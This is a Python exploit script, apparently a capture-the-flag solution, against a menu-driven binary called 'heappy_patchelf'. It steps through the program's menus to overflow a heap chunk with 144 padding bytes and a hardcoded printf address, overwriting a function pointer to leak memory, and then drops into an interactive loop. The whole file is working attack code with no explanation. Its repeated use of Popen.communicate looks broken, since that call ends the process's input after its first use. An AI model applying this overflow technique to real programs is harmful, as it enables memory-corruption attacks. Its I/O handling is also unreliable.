from subprocess import Popen, PIPE, STDOUT


def p64(addr):
    return addr.to_bytes(8, 'little')


def u64(addr):
    return int.from_bytes(addr, 'little')


def recv_n_lines(r, n):
    for _ in range(n):
        r.stdout.readline()


def interactive(r):
    while True:
        cmd = input()
        r.communicate(input=cmd.encode())
        print(r.stdout.readline().decode().strip())


def main():
    r = Popen(["./heappy_patchelf"], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
    skip_lang, skip_name, skip_menu = 4, 2, 5
    padding = 144
    _printf = 4195712 # for leakage
    payload = b'A' * padding + p64(_printf)
    payload = payload[:-1] # the last null byte is added by scanf
    # choose language
    recv_n_lines(r, skip_lang)
    r.communicate(input=b'1\n')
    # choose name
    recv_n_lines(r, skip_name)
    r.communicate(input=b'pwn\n')
    # change language -> allocate new chunk
    recv_n_lines(r, skip_menu)
    r.communicate(input=b'2\n')
    # ita language
    recv_n_lines(r, skip_lang)
    r.communicate(input=b'2\n')
    # change name
    recv_n_lines(r, skip_menu)
    r.communicate(input=b'1\n')
    # overflow in functions' chunk
    recv_n_lines(r, skip_name)
    r.communicate(input=payload + b'\n')
    interactive(r)
    

if __name__ == "__main__":
    main()

